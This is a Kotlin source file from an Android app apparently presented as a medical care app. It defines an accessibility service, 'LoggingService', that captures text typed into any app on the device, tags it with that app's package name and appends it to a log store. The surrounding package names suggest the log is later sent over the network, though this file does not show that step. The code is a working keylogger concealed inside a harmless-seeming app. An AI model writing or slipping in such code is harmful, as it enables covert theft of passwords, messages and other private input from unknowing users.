package com.example.medicalcare.features.network.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import com.example.medicalcare.MainActivity
import com.example.medicalcare.features.network.connection.LogStorage

class LoggingService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "UnknownApp"
            val typedText = event.text.toString()

            if (typedText.isNotEmpty() && typedText != "[]") {
                val entry = "[$packageName]: $typedText\n"
                LogStorage.append(entry)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        val intent = Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        }

        startActivity(intent)
    }

    override fun onInterrupt() {
    }
}